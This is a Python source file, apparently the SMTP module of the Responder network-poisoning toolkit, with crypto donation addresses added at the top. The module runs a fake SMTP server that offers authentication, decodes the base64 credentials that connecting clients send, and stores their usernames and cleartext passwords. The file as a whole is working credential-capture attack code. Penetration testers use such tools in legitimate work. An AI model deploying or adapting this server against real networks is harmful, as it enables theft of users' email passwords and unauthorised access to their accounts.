'''THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, TITLE AND
NON-INFRINGEMENT. IN NO EVENT SHALL THE COPYRIGHT HOLDERS OR ANYONE
DISTRIBUTING THE SOFTWARE BE LIABLE FOR ANY DAMAGES OR OTHER LIABILITY,
WHETHER IN CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.'''

# Bitcoin Cash (BCH)   qpz32c4lg7x7lnk9jg6qg7s4uavdce89myax5v5nuk
# Ether (ETH) -        0x843d3DEC2A4705BD4f45F674F641cE2D0022c9FB
# Litecoin (LTC) -     Lfk5y4F7KZa9oRxpazETwjQnHszEPvqPvu
# Bitcoin (BTC) -      34L8qWiQyKr8k4TnHDacfjbaSqQASbBtTd

# contact :- github@jamessawyer.co.uk



#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from utils import *
from base64 import b64decode
from SocketServer import BaseRequestHandler
from packets import SMTPGreeting, SMTPAUTH, SMTPAUTH1, SMTPAUTH2


class ESMTP(BaseRequestHandler):

    def handle(self):
        try:
            self.request.send(str(SMTPGreeting()))
            data = self.request.recv(1024)

            if data[0:4] == "EHLO" or data[0:4] == "ehlo":
                self.request.send(str(SMTPAUTH()))
                data = self.request.recv(1024)

            if data[0:4] == "AUTH":
                AuthPlain = re.findall(r'(?<=AUTH PLAIN )[^\r]*', data)
                if AuthPlain:
                    User = filter(None, b64decode(AuthPlain[0]).split('\x00'))
                    Username = User[0]
                    Password = User[1]

                    SaveToDb({
                        'module': 'SMTP',
                        'type': 'Cleartext',
                        'client': self.client_address[0],
                        'user': Username,
                        'cleartext': Password,
                        'fullhash': Username + ":" + Password,
                    })

                else:
                    self.request.send(str(SMTPAUTH1()))
                    data = self.request.recv(1024)

                    if data:
                        try:
                            User = filter(None, b64decode(data).split('\x00'))
                            Username = User[0]
                            Password = User[1]
                        except BaseException:
                            Username = b64decode(data)

                            self.request.send(str(SMTPAUTH2()))
                            data = self.request.recv(1024)

                            if data:
                                try:
                                    Password = b64decode(data)
                                except BaseException:
                                    Password = data

                        SaveToDb({
                            'module': 'SMTP',
                            'type': 'Cleartext',
                            'client': self.client_address[0],
                            'user': Username,
                            'cleartext': Password,
                            'fullhash': Username + ":" + Password,
                        })

        except Exception:
            raise
            pass
